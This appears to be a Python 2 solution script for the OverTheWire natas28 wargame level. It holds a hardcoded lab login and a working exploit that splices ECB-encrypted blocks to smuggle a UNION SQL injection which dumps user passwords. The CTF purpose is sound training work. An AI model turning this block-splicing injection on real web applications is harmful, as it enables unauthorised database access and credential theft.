import base64
import subprocess
import urllib

# For a given query string find the encrypted query param
def q(s):

	s = urllib.quote_plus(s)
	result = subprocess.check_output("curl -I -u natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF http://natas28.natas.labs.overthewire.org?query=" + s + " 2>/dev/null", shell=True)
	print(result)
	key = "Location: search.php/?query="
	pos = result.find(key)
	pos += len(key)
	start = pos
	while result[pos] != "\n":

		pos += 1
		encoded = result[start:pos]
		decoded = urllib.unquote(encoded).decode("utf8")

	return base64.b64decode(decoded)

# Prepend 9 spaces to fill third block. The third block
# actually has room for 10 characters but the backslash
# escape character from the single quote will
# fill in the 10th remaining character in the third block!
apos = (" " * 9) + "'UNION ALL SELECT password FROM users;#"

# Just a calculation to find how many blocks our encrypted
# sql injection stirng occupies
blocks = (len(apos) - 10)
while blocks % 16 != 0:

	blocks = blocks + 1

blocks = blocks / 16

inject = q(apos)

# Create an ordinary query that ends the third block
# cleanly with the sql query"s single quote still open
spaces = " " * 10
base = q(spaces)

# Patch in our encrypted blocks that contain our sql injection
b64 = base64.b64encode(base[0:48] + inject[48:(48 + 16*blocks)] + base[48:])
url = urllib.quote_plus(b64)

# Prints a query param which gives us the password
print(url)